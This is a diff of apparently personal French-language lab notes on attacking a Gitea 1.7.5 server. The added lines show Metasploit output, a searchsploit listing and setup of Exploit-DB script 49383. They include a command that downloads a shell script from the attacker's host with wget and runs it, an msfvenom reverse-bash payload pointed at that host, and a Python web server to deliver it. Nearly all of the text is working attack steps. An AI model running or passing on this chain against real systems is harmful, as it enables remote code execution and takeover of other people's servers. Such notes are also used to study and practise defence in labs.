@@ -29,29 +29,49 @@ mail : test@test.com
 set USERNAME test
 set PASSWORD testtest
 
-set SRVHOST 192.168.49.62
-set SRVPORT 8080
-
-set TARGETURI /gitea/
+set LHOST 192.168.49.55 (ip de la machine attaquante)
 run
 
-PASSWORD   testtest         yes       Password to use
-Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies
-                                    : socks5, http, socks5h, sapni, socks4
-RHOSTS     192.168.62.67    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
-                                    s/using-metasploit.html
-RPORT      3000             yes       The target port (TCP)
-SSL        false            no        Negotiate SSL/TLS for outgoing connections
-SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-TARGETURI  /                yes       Base path
-URIPATH                     no        The URI to use for this exploit (default is random)
-USERNAME   test             yes       Username to authenticate with
-VHOST                       no        HTTP server virtual host
+[*] Repository Rank_Bytecard deleted.
+[*] Exploit completed, but no session was created.
 
-set TARGETURI /gitea/
-https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa
+test avec searchsploit gitea
 
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Gitea 1.12.5 - Remote Code Execution (Authenticated)                    | multiple/webapps/49571.py
+Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit)                 | multiple/webapps/51009.rb
+Gitea 1.22.0 - Stored XSS                                               | multiple/webapps/52077.txt
+Gitea 1.24.0 - HTML Injection                                           | multiple/webapps/52087.txt
+Gitea 1.4.0 - Remote Code Execution                                     | multiple/webapps/44996.py
+Gitea 1.7.5 - Remote Code Execution                                     | multiple/webapps/49383.py
 
 
+Ma version est 1.7.5 donc  multiple/webapps/49383.py
 
+https://www.exploit-db.com/exploits/49383
+le script fait référence à un script shell que l'on va devoir créer, on modifie le script par nos infos :
+wget http://192.168.1.1:8080/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'
 
+USERNAME = "test" (crée sur gitea)
+PASSWORD = "testtest" (crée sur gitea)
+HOST_ADDR = '192.168.49.55' (mon ip)
+HOST_PORT = 3000
+URL = 'http://192.168.55.67:3000'        (la cible)                                                                >
+CMD = 'wget http://192.168.49.55:8080/shell.sh -O /tmp/shell.shh && chmod 777 /tmp/shell.sh && /tmp/shell.sh'  
+
+utilisons msfvenom pour créer un playload 
+
+générer avec msfvenom
+compiler pour l'OS
+héberger le shell sur mon serveur http
+la cible execute le wget
+
+msfvenom -p [tab] on trouve un reverse bash
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.49.55 LPORT=4444 -f raw > shell.sh
+
+notre shell.sh est crée
+
+???(root?kali)-[/home/kali]
+??# python3 -m http.server 8080
